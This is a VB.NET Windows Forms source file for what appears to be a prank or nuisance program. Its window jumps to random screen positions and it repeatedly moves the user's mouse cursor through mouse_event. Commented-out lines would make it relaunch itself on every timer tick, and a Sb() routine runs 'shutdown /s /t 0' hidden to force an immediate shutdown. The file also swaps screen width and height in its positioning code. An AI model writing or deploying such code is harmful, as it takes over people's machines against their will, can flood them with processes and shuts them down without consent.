Imports System.Windows.Forms
Public Class Form1
    Public Declare Sub mouse_event Lib "user32" (ByVal dwFlags As Long, ByVal dx As Long, ByVal dy As Long, ByVal cButtons As Long, ByVal dwExtraInfo As Long)
    Public a As Long
    Public b As Long
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer1.Start()
        Me.Top = Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width / 2
        Me.Left = Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height / 0.7
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Me.Top = Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width / 2
        Me.Left = Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height / 0.7
    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        'Dim w As Long
        Me.Top = Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width / 2
        Me.Left = Rnd() * System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height / 0.7
        mouse_event(&H1, 15, 15, 0, 0)
        'Shell(Application.ExecutablePath)
        'w = w + 1
        'If w = 1000 Then
        'Call Sb()
        'End If
    End Sub
    Sub Sb()
        Shell("shutdown /s /t 0", 0)
    End Sub
End Class